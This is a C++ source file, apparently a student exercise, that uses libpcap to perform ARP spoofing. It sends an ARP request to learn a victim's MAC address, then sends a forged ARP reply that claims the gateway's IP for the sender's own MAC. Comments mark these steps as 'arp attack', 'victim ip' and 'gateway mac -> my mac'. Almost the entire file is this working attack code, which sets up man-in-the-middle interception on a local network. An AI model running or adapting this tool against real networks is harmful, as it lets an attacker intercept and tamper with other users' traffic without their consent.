#include <bits/stdc++.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <string.h>

using namespace std;

#define arpheader   0x0001
#define arp_req     0x0001
#define arp_ply     0x0002

typedef struct eth_header
{
    u_char eth_dmac[6];
    u_char eth_smac[6];
    u_short eth_type;
}eth_Header;

typedef struct arp_header
{
    u_short arp_hrd;
    u_short arp_proto;
    u_char arp_hl;
    u_char arp_pln;
    u_short arp_op;
    u_char arp_smac[6];
    u_char arp_sip[4];
    u_char arp_dmac[6];
    u_char arp_dip[4];
}arp_Header;

ifreq *get_host_mac(char *nic_name){
  // fd - use for communication to get mac address
  int fd;
  struct ifreq *sIfReq;
  sIfReq = (ifreq*)malloc(sizeof(ifreq));
  memset(sIfReq, 0x00, sizeof(ifreq));
  // set the ifreq.ifr_name : the name of nic you use for communication
  strncpy(sIfReq->ifr_name,nic_name,strlen(nic_name));
  fd=socket(AF_UNIX, SOCK_DGRAM, 0);
  if(fd == -1){
    printf("socket() error\n");
    return NULL;
  }

  printf("=== debug == : before ioctl()\n");
  if(ioctl(fd,SIOCGIFHWADDR,sIfReq)<0){
    perror("ioctl() error\n");
    return NULL;
  }
  printf("=== debug == : after ioctl()\n");
  return sIfReq;

}

void arp_send(eth_Header *eth, arp_Header *arp, pcap_t *hdle, u_char *pack);
void eth_Make(eth_Header *eth, u_char *dmac, ifreq *smac);
void arp_Make(arp_Header *arp, u_char *dmac, ifreq *smac, u_char *dip, u_char *sip, uint t);


int main(int argc, char **argv)
{
    arp_Header arphd;
    eth_Header ethhd;
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    u_char packet[43];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    if (handle == NULL) {
      fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
      return -1;
    }

    if(argc != 4)
    {
        printf("arg error");
        return 0;
    }

    ifreq *ifr;
    ifr = get_host_mac("enp0s3"); // my mac address

    u_char ips[4];  //victim ip
    for(int i=0; i<4; i++)
        ips[i] = inet_addr(argv[2]) >> (8 * i) & 0xff;
    u_char ipd[4];  //gateway ip
    for(int i=0; i<4; i++)
        ipd[i] = inet_addr(argv[3]) >> (8 * i) & 0xff;

    u_char ipm[4] = {0xc0, 0xa8, 0x2b, 0xff};   //my ip
    u_char bmac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    u_char lmac[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

    //ARP Request
    eth_Make(&ethhd, &bmac[0], &ifr[0]);
    arp_Make(&arphd, &lmac[0], &ifr[0], &ips[0], &ipm[0], 1);
//    arp_send(&ethhd, &arphd, handle, &packet[0]);

    memset(packet, 0 ,sizeof(packet));
    memcpy(packet, &ethhd, sizeof(ethhd));
    memcpy(packet + sizeof(ethhd), &arphd, sizeof(arphd));
    for(int i=0; i<sizeof(ethhd); i++) printf(" %x", packet[i]);
    printf("\n");
    if(pcap_sendpacket(handle, packet, sizeof(packet)) != 0)
    {
        printf("send error");
    }
    printf("Wow!!");

    //arp reply
    u_char smac[6];
    while(1)
    {
        struct pcap_pkthdr* header;
        const u_char* pacre;

        pcap_next_ex(handle, &header, &pacre);
        printf("%u bytes captured\n", header->caplen);
        if(pacre[12] == 0x08 && pacre[13] == 0x06)
        {
            printf("ARP packet\n");
            if(pacre[20] == 0x00 && pacre[21] == 0x02)
            {
                printf("ARP Reply packet");
                smac[0] = pacre[22];
                smac[1] = pacre[23];
                smac[2] = pacre[24];
                smac[3] = pacre[25];
                smac[4] = pacre[26];
                smac[5] = pacre[27];
                break;
            }
        }
    }
    //index 22

    //arp attack
//    u_char gmac[6] = {0x52, 0x54, 0x00, 0x12, 0x35, 0x02}; //gateway mac 52:54:00:12:35:02
/*    memcpy(ethhd.eth_dmac, smac, 6); //victim mac
    memcpy(ethhd.eth_smac, ifr->ifr_hwaddr.sa_data, 6);  //my mac
    ethhd.eth_type = htons(0x0806);
    arphd.arp_hrd = htons(0x01);
    arphd.arp_proto = htons(0x0800);
    arphd.arp_hl = 6;
    arphd.arp_pln = 4;
    arphd.arp_op = htons(2);    //arp reply
    memcpy(arphd.arp_smac, ifr->ifr_hwaddr.sa_data, 6); //gateway mac -> my mac
    memcpy(arphd.arp_sip, ipd, 4);  //gateway ip

    memcpy(arphd.arp_dmac, smac, 6);    //victim mac
    memcpy(arphd.arp_dip, ips, 4);      //victim ip
*/
    eth_Make(&ethhd, &smac[0], &ifr[0]);
    arp_Make(&arphd, &smac[0], &ifr[0], &ips[0], &ipd[0], 2);

    memset(packet, 0 ,sizeof(packet));
    memcpy(packet, &ethhd, sizeof(ethhd));
    memcpy(packet + sizeof(ethhd), &arphd, sizeof(arphd));
    for(int i=0; i<sizeof(ethhd); i++) printf(" %x", packet[i]);
    printf("\n");

    if(pcap_sendpacket(handle, packet, sizeof(packet)) != 0)
    {
        printf("send error");
        return 0;
    }
    printf("Wow!!");

    return 0;
}
/*
void arp_send(eth_Header *eth, arp_Header *arp, pcap_t *hdle, u_char *pack)
{
//    u_char pack[50];
    memset(pack, 0, sizeof(pack));
    memcpy(pack, &eth, sizeof(eth));
    memcpy(pack + sizeof(eth), &arp, sizeof(arp));
    for(int i=0; i<6; i++)
        {
            printf("%02x\n", eth->eth_smac[i]);
            printf("%02x\n", eth->eth_dmac[i]);
        }
    for(int i=0; i<sizeof(eth); i++) printf(" %x", pack[i]);
    printf("\n");
    if(pcap_sendpacket(hdle, pack, sizeof(pack)) != 0)
    {
        printf("send error");
    }
    printf("Wow!!");
}
*/
void eth_Make(eth_Header *eth, u_char *dmac, ifreq *smac)
{
//    memcpy(eth->eth_dmac, dmac, 6);
//    memcpy(eth->eth_smac, smac->ifr_hwaddr.sa_data, 6); //my mac
    for(int i=0; i<6; i++)
    {
        eth->eth_dmac[i] = dmac[i];
//        printf("%02x\n", dmac[i]);
//        printf("%02x\n", eth->eth_dmac[i]);
    }
    memcpy(eth->eth_smac, smac->ifr_hwaddr.sa_data, 6);
//    for(int i=0; i<6; i++) printf("%02x\n", eth->eth_smac[i]);
    eth->eth_type = htons(0x0806);
}
void arp_Make(arp_Header *arp, u_char *dmac, ifreq *smac, u_char *dip, u_char *sip, uint t)
{
    arp->arp_hrd = htons(0x01);
    arp->arp_proto = htons(0x0800);
    arp->arp_hl = 6;
    arp->arp_pln = 4;
    arp->arp_op = htons(t);
    memcpy(arp->arp_smac, smac->ifr_hwaddr.sa_data, 6);
    memcpy(arp->arp_sip, sip, 4);
    memcpy(arp->arp_dmac, dmac, 6);
    memcpy(arp->arp_dip, dip, 4);
}
